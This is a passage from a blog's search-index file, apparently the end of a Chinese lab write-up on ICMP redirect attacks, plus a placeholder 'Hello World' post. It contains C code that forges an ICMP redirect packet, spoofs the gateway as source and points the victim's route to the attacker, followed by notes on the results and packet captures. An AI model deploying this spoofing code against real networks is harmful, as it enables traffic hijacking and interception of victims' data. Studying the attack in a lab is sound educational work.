class="line"></span><br><span class="line">iph-&gt;ip_hl = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_tos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_ttl = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_len = <span class="number">56</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_id = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_off = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_p = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_sum = <span class="number">0</span>; <span class="comment">//抓包的时候显示ip检验和没有检验 所以不用填也可以</span></span><br><span class="line"></span><br><span class="line">iph-&gt;ip_src.s_addr = inet_addr(ip_gw); <span class="comment">//源地址为网关地址</span></span><br><span class="line"></span><br><span class="line">iph-&gt;ip_dst.s_addr = inet_addr(ip_tgt); <span class="comment">//目的地址为被攻击机地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//填充icmp头部</span></span><br><span class="line"></span><br><span class="line">icmph-&gt;icmp_type = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">icmph-&gt;icmp_code = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">icmph-&gt;icmp_hun.ih_gwaddr.s_addr = inet_addr(ip_atk); <span class="comment">//重定向到攻击者地址</span></span><br><span class="line"></span><br><span class="line">icmph-&gt;icmp_cksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">icmph-&gt;icmp_cksum = checksum(out_packet + <span class="number">20</span>, <span class="number">36</span>); <span class="comment">//检验和</span></span><br><span class="line"></span><br><span class="line">dest.sin_family = AF_INET; \</span><br><span class="line"></span><br><span class="line">dest.sin_addr.s_addr = inet_addr(ip_tgt); <span class="comment">//目标ip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sendto(sockfd, &amp;out_packet, <span class="number">56</span>, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;dest, <span class="keyword">sizeof</span>(dest)) &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error number: %d\n&quot;</span>, errno);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数说明：sendto() 用来将数据由指定的socket 传给对方主机. 参数s 为已建好连线的socket, 如果利用UDP协议则不需经过连线操作. 参数msg 指向欲连线的数据内容, 参数flags 一般设0, 详细描述请参考send(). 参数to 用来指定欲传送的网络地址, 结构sockaddr 请参考bind(). 参数tolen 为sockaddr 的结果长度.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Sent a packet\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于数据包，前14字节为帧首部，之后20字节为ip首部，之后8字节为icmp首部，之后28字节的内容应填写为针对的原始ip首部及数据部分前28字节。（实验中测试了这28字节，发现一个比较疑惑的点：无论是否填写该部分内容，对结果都没有影响，都可以实现重定向。）</p><ol start="3"><li>代码实现结果：</li></ol><p>可以看到，攻击机进行攻击时会不断嗅探受害者发送的包，并返回一个重定向包。</p><p><img src="/../images/image-20221211153200226.png" alt="image-20221211153200226"></p><p>此时受害者进行ping操作时，会收到重定向包。</p><p><img src="/../images/image-20221211153220185.png" alt="image-20221211153220185"></p><p>利用wireshark抓包，可以看到重定向包内容，且该重定向包的源IP为原网关的IP地址。</p><p><img src="/../images/image-20221211153235749.png" alt="image-20221211153235749"></p>]]></content>
      
      
      
        <tags>
            
            <tag> uncatogerised </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/12/10/hello-world/"/>
      <url>/2022/12/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>testK4NN0N</p>]]></content>
      
      
      
        <tags>
            
            <tag> uncatogerised </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
